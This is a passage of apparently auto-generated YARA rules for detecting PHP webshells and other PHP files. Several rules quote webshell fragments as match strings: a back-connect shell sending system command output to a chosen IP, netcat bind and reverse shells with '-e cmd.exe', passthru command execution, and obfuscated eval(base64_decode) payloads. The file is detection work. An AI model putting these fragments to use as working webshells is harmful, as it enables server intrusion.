      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule ad32ffdce15b2dd53e356ec68010f86e16f216b9
{
   meta:
      description = "php17 - file ad32ffdce15b2dd53e356ec68010f86e16f216b9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f46dc0482a25e972f5547bc72766e45d7a7abd4874b6792754734ecd35f9cc38"
   strings:
      $s1 = "<address>Apache Server at \".$_SERVER[\"HTTP_HOST\"].\" Port 80 </address>" fullword ascii
      $s2 = "$password = \"8f841a9b44b0167db6056389e0106af4\";" fullword ascii
      $s3 = "if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password)" fullword ascii
      $s4 = "$chk_login = 1;" fullword ascii
      $s5 = "if($chk_login)" fullword ascii
      $s6 = "$psw = trim($_POST['pass']);" fullword ascii
      $s7 = "<input type=password name=pass>" fullword ascii
      $s8 = "if($pass == $password)" fullword ascii
      $s9 = "zwDWzY6U91Mo9rXwxumlPU6nTrd6Z1KmtNS9FeYAUt6lNapOW0ZAE8bBZKRmlrf7dSePg6NxSuuNybnh6Md4pKTeV0zvuQcjVdFG7FfrKVsbIn5x2WyVluF0xuxe5q+6" ascii
      $s10 = "e an ErrorDocument to handle the request.</p>" fullword ascii
      $s11 = "input { margin:0;background-color:#fff;border:1px solid #fff; }" fullword ascii
      $s12 = "cTqO/t8jHnabgE2Yv6kZMW1iqxAQv2l/N491OUisQq+dOCcPWkbGRwTbn5+zAX/zNX/7vX/3Pv/3Nn/zib//zc52IJTMkTh7ZmL0Tnsqw8zIh9trlh0ZBOhk9+Xp2EAR" ascii
      $s13 = "JnSgYoqwx6PwE0xA1VRxAq4jJW9SFyBAukjdsGUPqiQQVCdpnm0omA4KfZYTxlJgdYRaMBgvbPp81waDxJ7/+T/9nZtRhR62eJGuyK0eVFRTzz//s3/7fYNj2Td7XwWq" ascii
      $s14 = "zKmR88EQodkZFLbdnmKB//fUBtX54WUDEkJhi+oLXhmjdwX30110wepBhAKwu7ud34RGG7MNgnnp4YCBdwvxlgPFIQ4BxVggYF4faYrO+TGZdyfglAZqxeEuBJKHiFWB" ascii
      $s15 = "$pass = md5(md5(md5($pass)));" fullword ascii
      $s16 = "$_SESSION['ses'] = \"$pass\";" fullword ascii
      $s17 = "dD/IKnDNWXagnSAdCL6Jsbnk8RpK5vIvrS9qxjFNWsXsDlEQP63V49lCvFrqIuYOCh0GbGpMwBpwCGNYdc2iLcoCpuAgR7rNlNOGksjBGZRLzoWXUGoBmCJM0TNlkKUG" ascii
      $s18 = "G/tBJdad2+qBpiLnDXKXTf5S3e2f1zFixNnU0Bqy5x+fixbF1dN0Ycy1nMLKkfHbNnpinFcmS7NGd0j+QjZQ8QRYoZ1SymQ21tYkAUuVxLrX5IDwqp2d5tVq1hqeXwrh" ascii
      $s19 = "M/7Be6auZ6bFydnvz1Bv3Offi8VQeuqnp6cmFen2w4QxulX7uThbPKy1D03unp/bThtmr3mwpucbdSe7wWr+uCmbLeapvP0yeLg+ddH2nKV1WrgaHnJyaOKn+4Na5yB8" ascii
      $s20 = "ug1i56kHtv/6zv/z5L//pr//7f/g3b+IcLkPiHFGKsPKmQbpZPaGSLEi6arzrddVk3xyFaonY6isMhznpmnPV95tUATuvvPPv7Imoy9l6YBkIagKv30o1jmVNM/9JiDQ" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule activeServer_mysqlDAL_class
{
   meta:
      description = "php17 - file activeServer_mysqlDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "084e14c4a4ab9acbd6743b97e015654361f1191ee6976be7ce7d128a757d990c"
   strings:
      $s1 = "$all = $this->mysqlHelper->getRecords('SELECT * FROM activeserver ORDER BY RAND() LIMIT 1');" fullword ascii
      $s2 = "$all = $this->mysqlHelper->getRecords('select GUID,interfaceURL,renewTime from activeServer ORDER BY renewTime DESC ');" fullword ascii
      $s3 = "$all = $this->mysqlHelper->getRecords('select GUID,interfaceURL,renewTime from activeServer ORDER BY renewTime DESC " fullword ascii
      $s4 = "$all = $this->mysqlHelper->getRecords('select GUID,interfaceURL,renewTime from activeServer ORDER BY renewTime D" fullword ascii
      $s5 = "$all = $this->mysqlHelper->getRecords('select GUID,interfaceURL,renewTime from activeServer ' . $buildStr . ' OR" fullword ascii
      $s6 = "$all = $this->mysqlHelper->getRecords('select GUID,nterfaceURL,renewTime from activeServer ' . $buildStr . ' ORDER B" fullword ascii
      $s7 = "$this->mysqlHelper->update(\"update activeServer set interfaceURL='\".$model->interfaceURL.\"',renewTime=now() where GUID='" fullword ascii
      $s8 = "$rowsCount=$this->mysqlHelper->getRows('select COUNT(*) from activeServer '.$buildStr);" fullword ascii
      $s9 = "$this->mysqlHelper->insert(\"insert into activeServer (GUID,interfaceURL,renewTime) VALUES ('\".$model->GUID.\"','\".$model-" fullword ascii
      $s10 = "$rowsCount=$this->mysqlHelper->getRows('select COUNT(*) from activeServer');" fullword ascii
      $s11 = "function  GetPageList(activeServerModel $model, $start, $limit)" fullword ascii
      $s12 = "function  GetPageCount(activeServerModel $model, $perPageCount)" fullword ascii
      $s13 = "if(empty($model->GUID)&&empty($model->renewTime)&& empty($model->interfaceURL)){" fullword ascii
      $s14 = "function  GetModel(activeServerModel $model)" fullword ascii
      $s15 = "function  GetList(activeServerModel $model)" fullword ascii
      $s16 = "if (empty($model->GUID) && empty($model->renewTime) && empty($model->interfaceURL)) {" fullword ascii
      $s17 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s18 = "// TODO: Implement GetPageList() method." fullword ascii
      $s19 = "// TODO: Implement GetList() method." fullword ascii
      $s20 = "// TODO: Implement GetModel() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_68ce068cb21775c4e91a66255ba7ee6b7c7b608d
{
   meta:
      description = "php17 - file 68ce068cb21775c4e91a66255ba7ee6b7c7b608d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a6791f00bfa0a03eab327b6583e71b72e9ed48c7fc7358267a06804c9a9c4b4"
   strings:
      $s1 = "<?php$lll11l11l11l11l1=__FILE__;eval(base64_decode('JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbD" ascii
      $s2 = "<?php$lll11l11l11l11l1=__FILE__;eval(base64_decode('JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbD" ascii
      $s3 = "MWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNN" ascii
      $s4 = "VEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hi" ascii
      $s5 = "Ykd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hz" ascii
      $s6 = "JGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNN" ascii
      $s7 = "oJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd" ascii
      $s8 = "bGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hz" ascii
      $s9 = "Yjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRu" ascii
      $s10 = "ZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1Rf" ascii
      $s11 = "4bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd" ascii
      $s12 = "UEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNI" ascii
      $s13 = "aWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRB" ascii
      $s14 = "qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0p" ascii
      $s15 = "1URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2" ascii
      $s16 = "cGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM5" ascii
      $s17 = "WydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0Zlhr" ascii
      $s18 = "2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c" ascii
      $s19 = "T09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShS" ascii
      $s20 = "RVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0K" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_8ee646b9683769b4d6febc6b839d8e4c5691c62c
{
   meta:
      description = "php17 - file 8ee646b9683769b4d6febc6b839d8e4c5691c62c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bad17777d7f6195c4088ce76b28042941cd116e79624f36aa4c002394de5a1e9"
   strings:
      $s1 = "${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);" fullword ascii
      $s2 = "$__.=(\"{\"^\"/\"); // _POST " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AnalyzerController
{
   meta:
      description = "php17 - file AnalyzerController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1bdcb73b0b37db8b54480a640005e076e392581150ccff14f0e4f5d6df2c391"
   strings:
      $s1 = "* Override here for any controller-specific functionality" fullword ascii
      $s2 = "// header(\"Content-type: text/plain\"); print_r($schema); die();" fullword ascii
      $s3 = "// initialize parameters that will be passed on to the code templates" fullword ascii
      $s4 = "* Analyze the database schema and display a listing of tables and options" fullword ascii
      $s5 = "$folder = new FolderHelper( GlobalConfig::$APP_ROOT . '/code/' );" fullword ascii
      $s6 = "return $a->GetName() > $b->GetName() ? 1 : -1;" fullword ascii
      $s7 = "$cstring = $this->GetConnectionString();" fullword ascii
      $s8 = "$appname = $this->GetAppName($connection);" fullword ascii
      $s9 = "$this->Assign('password', $cstring->Password);" fullword ascii
      $s10 = "$params[] = new AppParameter('PathToVerySimpleScripts', '/scripts/verysimple/');" fullword ascii
      $s11 = "$files = $folder->GetFiles('/config/');" fullword ascii
      $s12 = "$params[] = new AppParameter('PathToExtScripts', '/scripts/ext-2/');" fullword ascii
      $s13 = "require_once(\"libs/App/AppConfig.php\");" fullword ascii
      $s14 = "// load up the available packages (based on files: code/*.config)" fullword ascii
      $s15 = "* DefaultController is the entry point to the application" fullword ascii
      $s16 = "/** import supporting libraries */" fullword ascii
      $s17 = "* @package Adserv::Controller" fullword ascii
      $s18 = "require_once(\"verysimple/DB/Reflection/DBServer.php\");" fullword ascii
      $s19 = "require_once(\"verysimple/IO/FolderHelper.php\");" fullword ascii
      $s20 = "$this->Assign('host', $cstring->Host);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_2015_07_06_230816_create_vacancies_table
{
   meta:
      description = "php17 - file 2015_07_06_230816_create_vacancies_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d452e6ef93140dd953dbf57447fcb539827a70a5d144e2824b218f656e966b5"
   strings:
      $s1 = "$table->foreign('service_id')->references('id')->on('services')->onDelete('cascade');" fullword ascii
      $s2 = "$table->foreign('business_id')->references('id')->on('businesses');" fullword ascii
      $s3 = "$table->integer('service_id')->unsigned();" fullword ascii
      $s4 = "$table->timestamp('finish_at')->nullable()->index();" fullword ascii
      $s5 = "$table->timestamp('start_at')->nullable()->index();" fullword ascii
      $s6 = "$table->integer('business_id')->unsigned();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule sig_0dd568dbe946b5aa4e1d33eab1decbd71903ea04
{
   meta:
      description = "php17 - file 0dd568dbe946b5aa4e1d33eab1decbd71903ea04.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cbe12f96988b903c5d8f004a14c51e29bd146717f321082d52f5550891c1743"
   strings:
      $s1 = "<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>" fullword ascii
      $s2 = "packer_output(packer_jak3fr0z($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));" fullword ascii
      $s3 = "$res = packer_jak3fr0z($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);" fullword ascii
      $s4 = "function packer_jak3fr0z($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){" fullword ascii
      $s5 = "$output .= \"error : unknown options -c \".$compress_level.\" (use only 0-9)\\n\\n\";" fullword ascii
      $s6 = "$code = $header.$password.\"?>\".$content;" fullword ascii
      $s7 = "$output .= \"error : unknown options -z \".$compress.\"\\n\\n\";" fullword ascii
      $s8 = "if(!empty($password)) $password = \"\\$GLOBALS['pass'] = \\\"\".sha1(md5($password)).\"\\\"; // sha1(md5(pass))\\n\";" fullword ascii
      $s9 = "$output .= \"error : no filename given (use -o filename)\\n\\n\";" fullword ascii
      $s10 = "$output .= \"\\t-z [no|gzdeflate|gzencode|gzcompress]\\tcompression (use only with -b)\\n\";" fullword ascii
      $s11 = "<tr><td>Password</td><td><input id='password' type='text' value='jak3fr0z'></td></tr>" fullword ascii
      $s12 = "$code = $header.$password.\"\\$func=\\\"cr\\\".\\\"eat\\\".\\\"e_fun\\\".\\\"cti\\\".\\\"on\\\";\\$jak3fr0z=\\$func('\\$x','ev'." ascii
      $s13 = "$output .= \"error : use -z options only with -b\\n\\n\";" fullword ascii
      $s14 = "https://github.com/PhilCodex/jak3fr0z" fullword ascii
      $s15 = "https://github.com/PhilCodEx/jak3fr0z" fullword ascii
      $s16 = "$content = packer_read_file($filename.\".php\");" fullword ascii
      $s17 = "$output .= \"\\t-p password\\t\\t\\t\\tprotect with password\\n\";" fullword ascii
      $s18 = "var targeturl = '<?php echo packer_get_self(); ?>';" fullword ascii
      $s19 = "if(is_file($filename.\".php\")) $module_code .= packer_read_file($filename.\".php\");" fullword ascii
      $s20 = "send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_leve" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule actor_follower_add
{
   meta:
      description = "php17 - file actor_follower_add.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f72952b42cb693c65524ade02745647444f3e5ca9d3cee922964ce2255e3a467"
   strings:
      $s1 = "<?=sprintf(@text('COM-ACTORS-STORY-FOLLOWER-ADD'), @name($subject), @name($object), @name($target)) ?>" fullword ascii
      $s2 = "<?=sprintf(@text('COM-ACTORS-NOTIFICATION-FOLLOWER-ADD'), @name($subject), @name($object), @name($target)) ?>" fullword ascii
      $s3 = "<?php defined('KOOWA') or die('Restricted access');?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule activeServerModel_class
{
   meta:
      description = "php17 - file activeServerModel.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "493ace131d97a00aabfc2b402e3cab9e00bd66e00684f05c9ee540b81a3a971d"
   strings:
      $s1 = "* Date: 15/2/4" fullword ascii
      $s2 = "public function __construct($guidstr,$interfaceURLstr,$rnTime)" fullword ascii
      $s3 = "$this->interfaceURL=$interfaceURLstr;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a9f6388eac0eaa83fb918cec6a54a073818c7682
{
   meta:
      description = "php17 - file a9f6388eac0eaa83fb918cec6a54a073818c7682.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ef6dd73e7cc055e1bd6e1618fbfc44f0043e15a6f2206d0c43f6f4b13646e569"
   strings:
      $x1 = "$res=$api->WinExec(\"cmd.exe /c $command >\\\"$name\\\"\",0);" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x3 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x4 = "$exec=$ws->exec(\"cmd.exe /c $command\"); " fullword ascii
      $x5 = "win_shell_execute('cmd.exe','',\"/C $command >\\\"$name\\\"\");" fullword ascii
      $x6 = "$alias=\"<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250" ascii
      $x7 = "$cmd=(empty($_SERVER['ComSpec']))?'d:\\\\windows\\\\system32\\\\cmd.exe':$_SERVER['ComSpec'];" fullword ascii
      $x8 = "}else echo \"<center><form method='POST' name=form>${t}HTTP Auth cracker:</td><td bgcolor='#333333'><select name=method><option " ascii
      $x9 = "if(checkfunctioN('passthru')){ob_start();passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}" fullword ascii
      $x10 = "echo \"$t name=security><td>Security scanner:</td></tr><td width='25%' bgcolor='#808080'>From:</td><td bgcolor='#808080' width=8" ascii
      $x11 = "type=submit value=Execute></td></tr></form></td></tr><form method=post><tr><td bgcolor='#808080'><select name='cmd' width=70>$a" fullword ascii
      $x12 = "else echo \"<center><table border=0 style='border-collapse: collapse' width='434'><tr><td width='174' bgcolor='#333333'>HTTP For" ascii
      $x13 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href='http://netjackal.by.ru/' target='_blank'>NetJackal</a>$et\";" fullword ascii
      $x14 = "$crack=\"</td><td bgcolor='#333333'></td></tr><form method='POST' name=form><tr><td width='20%' bgcolor='#666666'>Dictionary:</t" ascii
      $x15 = "echo \"<center>${t}Use PHP Bugs:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>F" ascii
      $x16 = "$alias=\"<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value" ascii
      $x17 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x18 = "if(!$bd)echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x19 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x20 = "logged in users</option><option value='which wget curl lynx w3m'>Downloaders</option><option value='find / -perm -2 -type d -pri" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule ae9dff642860ca598a823983ce8920ac91c1a62c
{
   meta:
      description = "php17 - file ae9dff642860ca598a823983ce8920ac91c1a62c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "be62a60debf023021056cf11e8c9cb0b23bd5756246d67c14da79960d9f6021d"
   strings:
      $s1 = "z0rlu.blogspot.com" fullword ascii
      $s2 = "Usage: nc -vv -l -p 21<br>" fullword ascii
      $s3 = "admin@yildirimordulari.com ( only msn )" fullword ascii
      $s4 = "coded by ZoRLu" fullword ascii
      $s5 = "fputs($mucx , system(\"uname -a\") .$zamazing0 );" fullword ascii
      $s6 = "fputs ($mucx, $one. system(\"whoami\") .$two. \" \" .$message.\"\\n\"); " fullword ascii
      $s7 = "print ( '<title>ZoRBaCK Connect</title>' );" fullword ascii
      $s8 = "echo \"<br><b>ZoRBaCK Connect<br> " fullword ascii
      $s9 = "$portum=$_POST['portum']; " fullword ascii
      $s10 = "<input type='text' name='portum' size='5' value='21'><br><br> " fullword ascii
      $s11 = "$mucx=fsockopen($ipim , $portum , $errno, $errstr ); " fullword ascii
      $s12 = "<form method='POST' action=''><br> " fullword ascii
      $s13 = "fputs($mucx , system(\"id\") .$zamazing0.$zamazing0 );" fullword ascii
      $s14 = "$result= fgets ($mucx, 8192); " fullword ascii
      $s15 = "fputs($mucx , system(\"pwd\") .$zamazing0 );" fullword ascii
      $s16 = "$result = \"Error: didnt connect !!!\"; " fullword ascii
      $s17 = "fputs ($mucx ,\"\\nwelcome ZoRBaCK\\n\\n\");" fullword ascii
      $s18 = "$ipim=$_POST['ipim']; " fullword ascii
      $s19 = "<input type='text' name='ipim' size='15' value=''>" fullword ascii
      $s20 = "Your IP & Port:<br> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_38d6796680b82513e5e2d98db613cd937fb5adec
{
   meta:
      description = "php17 - file 38d6796680b82513e5e2d98db613cd937fb5adec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9da9f2968ade5ac350c42fb8aba3ff993b6360d65ded039762e371628372d839"
   strings:
      $x1 = "eval(gzinflate(base64_decode('FJ3Hrqtctkb79SL1SzTISSrdEjnnaDolcg4mw9Nf76PT2sGGteac3xjeNvz3//7z36VZ/vWv8kyHf+q3naoh3ct/snQrCex/RZ" ascii
      $s2 = "/UoW2t+qp9EAd1gA9F6Wln7jhWnycxPqdyDDsu+wl0+tfAEajyXB+D4qTjYkqCOc+XuynOqcePJBmEmEBeFJwZj/TWyoVA4idUMPAyBXxMYvkYBIgDtnp9MSzbhWMwlf" ascii
      $s3 = "sOs/c0UAA4kbZBDSPDdlX389sN6fq4oAJ8sxeCxMAnzNis04uKjHZpTosYZSMJBFoZKDM0piPEA1kH6+T9Jrs5f1vJ/O1wwGiz/7nOcP+iH7EQTXhDohuriJv/3DMa0Z" ascii
      $s4 = "PbeFf2hl+ebnwrJs/3Me2UTAuhsHCJHVeImKkMeqKjNvqOiqpQnow2im0auOv+Em+0XLYiosSish5+m+lloG5E8XVKMA+eT9y4XrWuOLmQJpVj52gtWpFGi/E9KIKXho" ascii
      $s5 = "Y4JNFF5wBU9t4i8x3GTsaf58nr8CO25kPk2rKfQF1/K1LNJzPsqoUmbl8Dtw38dBHUVW2FSqBiRCKnav32AsT39IF3Sd+kQC1rbtHIZevmhpaRQQlsC1YCO2gW9yLT+A" ascii
      $s6 = "BE1czRja3orgLIFdLlYZIimYWCN2khPhNx8D83HfWzdRAfPsLWkJY7Dfq1DZpTfPPhYdgcixgHU9nZSKp3Z2rpj0IfzLIyr4gINwUlwx6ZNonYa5thY93GfOHx0rl5Ka" ascii
      $s7 = "eai5KYFl5rvh+xaQhlC66DXJeFC/Mze2TilnngHDtYne6jbjcJ6x4GTE/X+0whgRmmL0IVV5pMJWNJpfKu7vRUrXS/Z8nOLNQ4n6+i3bWk5JDSpYr7eQ9W8CCJTP42EX" ascii
      $s8 = "TFMvGwEOSkVKM6ngtDA4DTmIVHm/BUPDNRqhpgkIHTt75wAM4I/N1mgpBQirPSILu+oyZIrcEWpzvjCpHYXBtLHiLK1baiMfL5QvzoPQ+yfY8Zn0QWmqg9+4GXTyW0BF" ascii
      $s9 = "/MmsVwIpJfX+GVLbCqi4Hy1o4uKuYjSpyGdSduoHqd49WE/SZQIzjb94x+hcfPNX0uxgJxAAZ5F2gHj0d4z30CM/1U6Htxywhv3JvaBwkyCZBmflRdJzp/Dyz1zuiIbK" ascii
      $s10 = "X6xvjaogBZUBfwDZfglEDVm7Y0IR5yDmh4D+95DaECHDxZopKGADofNG2oOf4fdQMigur5KlCDlLyhSQ1cYhCYtK5zUkSbDkJCIcnCcYXlNLjSVWOYPuiDHvsyVfka7b" ascii
      $s11 = "lYQkDELcdOZWn1p2WmJApqZMGmmJHzpElXY21WTzdHJw1hVFnjM3uGUwJrtoiDXa3HxGdi7zLxlki+oiUXJnKOgRgefTDowMKBNSih5m97aknhz7sSHyse7MeG4OdLLT" ascii
      $s12 = "zNjzkd0a7ki+aD+hdtZIncqdxu8hAUTq98H/duTJmoydcJqwNXY+/uM/WWUQCP0lCsvrEOOR7sPY7k7/UHuYuiVGe3mGFtCE2TtjVman1tlKCFQ2TGmavj3YDztKX5rl" ascii
      $s13 = "htv+KpCeceLWjYR5cLASb5waROV3858XJw7occUWjiMy3yKA1eR0la7i/nEA2aiHHw+DPostoSb4FqEZoHAEH81bwdSNzFKWhq75Ju58lvsuPZyZS+tWeZwseMJxYLf4" ascii
      $s14 = "5H+hpAzPWymFpVlvZZNzujgK1aSHdCEPPc8rsBYigl6eNAXerto/ZgPGHErROPPN94sJLNxfcccKuIm2mLwZPPTLN4R7ZPYMnsA71F1E7rAHo7+EsafQ8qn1PzXQdllm" ascii
      $s15 = "quM5TaeyExTMK35Tz+5IvGTDk+zmaC+VFvs065ozszTlIFv96VPjNGW55ZjCm7sfgNsiIJv8qB2zSA7A/DY0r58cfm2zfBG1wP4QvHr7onRKZrJV/Uw/cYZrE8XqXtZC" ascii
      $s16 = "F+9e+7ves8UOWqXuaaO/bkd28y0DNu10++EzpQrcfpgBlUfmFHmsp70LxJeTxue2rgChtCwdnpHBKG7k2KlCER7GuFv70D85mFj4JLOgdniwB8kzrL/frULp/LKtqzwr" ascii
      $s17 = "+BFX4aIoSl6DPMXEm7MIRCCHXB4JXsQEdq7QVhffGcgVi1bUJDeb9f4PHj+Mvaw6HJc8JW3Ba1gfe8T5Sbt4GCEd8wWsgc4g8BxumEpZ4mmvgRbUIN6ChVWiimczslVz" ascii
      $s18 = "1lEL6RDYn7lkSBrv5Dzqp0cUB1dMenmM8mr4OLsW0UsbmDPNyuRpbr1ioLmlpFQsVANT8cfX2Cd1wFg/YuZT9t6UBXdEzRU3iQUjRKanIJG4L17SZZlepikni8jfqmbW" ascii
      $s19 = "kh+9b0Tx+hYO6OlPHNc0EYeZOGNgEdlAVmC8pLJ6Yb0XDvai0dgMWjhFzVJh0+0zhEQk8sB8So4fQRZkuRlJBbLyFE0iPM9J1LTZuhju75xr9qzYvZHnrxgxXG5YB2oU" ascii
      $s20 = "fBYTxpa/vud+hf4CVWiV5Xn7SRTYxTzADLlwQyoZqaM+RD3/Hi55AwYXY4fCI8pIPLfCicKGL8QRet1hMPZqdFX6Uf9Bty9g05uLW++qB6gkWPcORy9TduQlCGHdX/JU" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_1b3b19e834d22baa5a95e1e82fe8ebc063b0218c
{
   meta:
      description = "php17 - file 1b3b19e834d22baa5a95e1e82fe8ebc063b0218c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "acd1ff56bc7fd1d9af77ac9033ae405f1253319db19b9d41b67253d166adee54"
   strings:
      $s1 = "# ftp://ftp.rfc-editor.org/in-notes/rfc1929.txt                                         #" fullword ascii
      $s2 = "# ftp://ftp.rfc-editor.org/in-notes/rfc1928.txt                                         #" fullword ascii
      $s3 = "if(!socket_bind($sock,  \"0.0.0.0\", $settings['PORT']))" fullword ascii
      $s4 = "$blocked_users  = array('127.0.0.2'" fullword ascii
      $s5 = "if(time() - $timeout[$id] > $settings['AUTH_TIMEOUT'])" fullword ascii
      $s6 = "VER.REP_BLOCKED_HOST.\"\\x00\\x01\".$ipport[$id]);" fullword ascii
      $s7 = "#   [+] LOGIN/PASSWORD authorization                      |   z" fullword ascii
      $s8 = "VER.REP_WRONG_COMMAND.\"\\x00\\x01\\x00\"." fullword ascii
